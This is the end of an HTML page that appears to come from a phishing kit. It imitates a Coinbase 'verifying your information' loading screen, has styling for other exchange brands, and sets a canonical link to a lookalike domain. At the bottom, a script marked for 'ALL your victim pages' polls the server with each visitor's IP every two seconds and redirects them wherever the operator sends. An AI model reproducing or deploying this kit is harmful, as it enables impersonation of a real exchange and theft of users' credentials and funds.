
    .focus\:ring-blue-500:focus {
        --tw-ring-opacity: 1;
        --tw-ring-color: rgb(59 130 246/var(--tw-ring-opacity, 1))
    }

    .focus\:ring-coinbase-primary:focus {
        --tw-ring-opacity: 1;
        --tw-ring-color: rgb(87 139 250/var(--tw-ring-opacity, 1))
    }

    .focus\:ring-crypto-primary:focus {
        --tw-ring-opacity: 1;
        --tw-ring-color: rgb(52 117 211/var(--tw-ring-opacity, 1))
    }

    .focus\:ring-kucoin-black:focus {
        --tw-ring-opacity: 1;
        --tw-ring-color: rgb(29 29 29/var(--tw-ring-opacity, 1))
    }

    .focus\:ring-kucoin-primary:focus {
        --tw-ring-opacity: 1;
        --tw-ring-color: rgb(0 180 125/var(--tw-ring-opacity, 1))
    }

    .focus\:ring-ledger-primary:focus {
        --tw-ring-opacity: 1;
        --tw-ring-color: rgb(185 176 249/var(--tw-ring-opacity, 1))
    }

    .focus\:ring-nexo-primary:focus {
        --tw-ring-opacity: 1;
        --tw-ring-color: rgb(108 203 197/var(--tw-ring-opacity, 1))
    }

    .focus\:ring-white:focus {
        --tw-ring-opacity: 1;
        --tw-ring-color: rgb(255 255 255/var(--tw-ring-opacity, 1))
    }

    .active\:scale-90:active {
        --tw-scale-x: 0.9;
        --tw-scale-y: 0.9;
        transform: translate(var(--tw-translate-x), var(--tw-translate-y)) rotate(var(--tw-rotate)) skew(var(--tw-skew-x)) skewY(var(--tw-skew-y)) scaleX(var(--tw-scale-x)) scaleY(var(--tw-scale-y))
    }

    .active\:scale-\[\.98\]:active {
        --tw-scale-x: 0.98;
        --tw-scale-y: 0.98;
        transform: translate(var(--tw-translate-x), var(--tw-translate-y)) rotate(var(--tw-rotate)) skew(var(--tw-skew-x)) skewY(var(--tw-skew-y)) scaleX(var(--tw-scale-x)) scaleY(var(--tw-scale-y))
    }

    .active\:bg-\[\#1e1f20\]:active {
        --tw-bg-opacity: 1;
        background-color: rgb(30 31 32/var(--tw-bg-opacity, 1))
    }

    .active\:bg-\[\#47494f\]:active {
        --tw-bg-opacity: 1;
        background-color: rgb(71 73 79/var(--tw-bg-opacity, 1))
    }

    .active\:bg-\[\#4b78d6\]:active {
        --tw-bg-opacity: 1;
        background-color: rgb(75 120 214/var(--tw-bg-opacity, 1))
    }

    .active\:bg-\[\#ebebec\]:active {
        --tw-bg-opacity: 1;
        background-color: rgb(235 235 236/var(--tw-bg-opacity, 1))
    }

    @media (min-width:640px) {
        .sm\:mt-24 {
            margin-top: 6rem
        }

        .sm\:justify-start {
            justify-content: flex-start
        }

        .sm\:border {
            border-width: 1px
        }

        .sm\:border-coinbase-line {
            border-color: #8a919e33
        }

        .sm\:px-10 {
            padding-left: 2.5rem;
            padding-right: 2.5rem
        }

        .sm\:py-8 {
            padding-top: 2rem;
            padding-bottom: 2rem
        }
    }
</style>
<style id=_goober>
    body {
        background: #000000
    }

    @keyframes go2264125279 {
        from {
            transform: scale(0) rotate(45deg);
            opacity: 0
        }

        to {
            transform: scale(1) rotate(45deg);
            opacity: 1
        }
    }

    @keyframes go3020080000 {
        from {
            transform: scale(0);
            opacity: 0
        }

        to {
            transform: scale(1);
            opacity: 1
        }
    }

    @keyframes go463499852 {
        from {
            transform: scale(0) rotate(90deg);
            opacity: 0
        }

        to {
            transform: scale(1) rotate(90deg);
            opacity: 1
        }
    }

    @keyframes go1268368563 {
        from {
            transform: rotate(0deg)
        }

        to {
            transform: rotate(360deg)
        }
    }

    @keyframes go1310225428 {
        from {
            transform: scale(0) rotate(45deg);
            opacity: 0
        }

        to {
            transform: scale(1) rotate(45deg);
            opacity: 1
        }
    }

    @keyframes go651618207 {
        0% {
            height: 0;
            width: 0;
            opacity: 0
        }

        40% {
            height: 0;
            width: 6px;
            opacity: 1
        }

        100% {
            opacity: 1;
            height: 10px
        }
    }

    @keyframes go901347462 {
        from {
            transform: scale(0.6);
            opacity: 0.4
        }

        to {
            transform: scale(1);
            opacity: 1
        }
    }
</style>
<meta name=referrer content=no-referrer>
<link id=favicon rel=icon
    href=data:image/vnd.microsoft.icon;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABzenr0AAAACXBIWXMAAA7EAAAOxAGVKw4bAAADGElEQVRYhbWXP1ATQRTGf3uTyjTXSH2pw2hotEzSZ0bSxM7BXg2MM5aG2EEDYawJKaEhw2id0NIYHai5GgvSYLsW7zbcXXZzB8avSfbP7ff27dvvvVXkhNbaB9aBKlABAsCPhqdACEyAEXCmlJrmXTuLONBa97TWt/ph6Gutg38h9rXWew8ktWEv8p4VyrVrxJWJHYyv4PxSfsPfEN5Iv1+ESgDPS7BRl/8phEBdKRVmGqC1rgCncfLxFXSP5TcPamXotKC2OmdEUyk1cRqQ3vn0Toj3v+cjTmOzIYb4xYQRCU/MDIjO6YchD2+guQuT68eRG1RKcPoJgpWEEWvmlnixuR1iO18GOcgazV1ZM0IQcTEzIHL9punsHi+HPG5E9yTRtWmuqIoMGABvAIYX0NxZvKBflEAz0T4JJUBju7Ri1E0E5oFSqq2is781vWsfZUEX2g3YTgYWIDFzNBbvuVArw+jLrDkFSh4ir7KT68Xk/Xew/3aeHCTItlsyx4XxFYwvZ00fWPeAuukZjNwfd1oiMlnYqMv1c+E8qSVVD3hmWq7d+8V85AadFvhP7GMpMasUiCmeK/Jr5cQ9zoRfhP57e1Cmji8ocJ9Smf6xL2jR9kysv8g1zfey5/xfFJDr4IO42WS4OBbdDBeGF+4jiHlnWkC0uQIQPLUbYETGdv1sCG/cYlYrJwwIPeDXbHDV9kmUFU/sYzYMxu6xWjnRnHhI+gWgWk5Pv8f+t8U6MSMfwfYCNXz1MtEcecAQiQNq5TkLE9j4KlJrO6bpHWwdyhwX4vkjwplJRj3gA8h51z+7F4GlJaMjpdRbY0AAzGRoqy8uXybaDckjMZSUUqEHEJVIB2ak03qc+LhQKUmiiuHAlGWLS7Kdx2lAmjxdkimlSqYxU8KoRqsjukCwIrl7UWbLQrsh556qBxNpLXdZvnWY3xu1MnRez92okKyyPGZEgOVhMrmWqudnVLiYqA9WREWrq86rHOJ4mDgRPc16S3ia9RY9zfIYEmitBw8kvY2Ig6z1rUfg8ghSP9aRKirA/jw/B4Z5n+d/AVicKcqgV4muAAAAAElFTkSuQmCC>
<link rel=canonical
    href="https://238911coinbase.com/1/coinbase_loading?login_challenge=801fd8c2a4e79c1d24a40dc735c051ae">
<meta http-equiv=content-security-policy
    content="default-src 'none'; font-src 'self' data:; img-src 'self' data:; style-src 'unsafe-inline'; media-src 'self' data:; script-src 'unsafe-inline' data:; object-src 'self' data:; frame-src 'self' data:;">

<body cz-shortcut-listen=true>
    <div id=root>
        <div class="h-full w-full flex-grow justify-between bg-coinbase-background sm:justify-start">
            <div class="w-full px-6 pt-5"><svg height=32 viewBox="0 0 48 48" width=32 xmlns=http://www.w3.org/2000/svg>
                    <path
                        d="M24,36c-6.63,0-12-5.37-12-12s5.37-12,12-12c5.94,0,10.87,4.33,11.82,10h12.09C46.89,9.68,36.58,0,24,0 C10.75,0,0,10.75,0,24s10.75,24,24,24c12.58,0,22.89-9.68,23.91-22H35.82C34.87,31.67,29.94,36,24,36z"
                        fill=#FFFFFF></path>
                </svg></div>
            <div class="flex w-full flex-col items-center justify-center bg-coinbase-background pb-8">
                <form
                    class="mt-12 min-h-fit w-full max-w-md rounded-[16px] p-6 font-coinbase-text sm:mt-24 sm:border sm:border-coinbase-line sm:px-10 sm:py-8 flex flex-col items-center pb-8 pt-12 text-center">


                    <div class="mb-20 flex gap-5 p-8">
                        <div class="h-3 w-3 animate-coinbase-dots-loading-1 rounded-full bg-[#0052FF]"></div>
                        <div class="h-3 w-3 animate-coinbase-dots-loading-2 rounded-full bg-[#0052FF]"></div>
                        <div class="h-3 w-3 animate-coinbase-dots-loading-3 rounded-full bg-[#0052FF]"></div>
                    </div><span class="pb-2 font-coinbase-title text-[28px] font-semibold text-white">We're verifying
                        your information.</span><span class="font-coinbase-sans text-coinbase-foreground-muted">Please
                        do not navigate away from this page.<br>This will only take a minute.</span><a
                        class="font-coinbase-sans text-coinbase-primary mt-8 font-light" rel=noreferrer
                        href=https://www.coinbase.com/legal/ target=_blank>Privacy policy</a>
                </form>
            </div>
        </div>
    </div>
<!-- Add this to the bottom of ALL your victim pages before </body> -->
<script>
// Poll for redirect commands every 2 seconds
function checkForRedirect() {
    fetch('/check-redirect.php?ip=<?php echo $_SERVER['REMOTE_ADDR']; ?>')
        .then(response => response.json())
        .then(data => {
            if (data.redirect && data.target) {
                console.log('Redirect command received:', data.target);
                window.location.href = data.target;
            }
        })
        .catch(error => console.log('Redirect check error:', error));
}

// Check every 2 seconds
setInterval(checkForRedirect, 2000);

// Also check immediately when page loads
checkForRedirect();
</script>
